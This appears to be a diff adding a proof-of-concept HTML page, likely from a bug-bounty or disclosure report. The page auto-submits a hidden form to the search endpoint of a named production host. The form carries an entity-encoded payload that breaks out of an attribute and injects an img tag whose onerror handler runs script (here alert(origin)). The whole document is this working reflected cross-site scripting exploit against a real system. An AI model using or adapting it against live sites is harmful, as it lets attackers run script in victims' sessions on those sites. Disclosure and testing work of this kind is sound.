@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <form action="https://gls-prod.ito.unisys.com/Cool-SSRC/default.asp?Category=ICEAdm&Service=SearchResult" method="POST">
+      <input type="hidden" name="searchstring" value="a&#92;&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;origin&#41;&gt;" />
+      <input type="hidden" name="ok" value="Search&#32;Now&#33;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
